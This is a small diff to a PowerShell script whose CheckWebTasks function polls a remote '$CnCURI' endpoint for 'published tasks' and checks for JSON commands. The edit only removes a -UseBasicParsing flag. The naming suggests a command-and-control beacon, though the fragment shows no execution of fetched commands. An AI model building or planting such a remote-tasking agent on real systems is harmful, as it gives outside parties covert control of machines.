@@ -3,7 +3,7 @@ $script:name=($MyInvocation.MyCommand.Name).Trim('.ps1')
 function CheckWebTasks() {
 	if (!(test-path $TaskDir)) {mkdir  $TaskDir}
 	#Check for published tasks
-	$WebCommand=(Invoke-WebRequest -Method POST -Headers $head -URI $CnCURI -UseBasicParsing).content
+	$WebCommand=(Invoke-WebRequest -Method POST -Headers $head -URI $CnCURI).content
 
 	#Check for JSON format
 	if ($WebCommand -match '{"') {
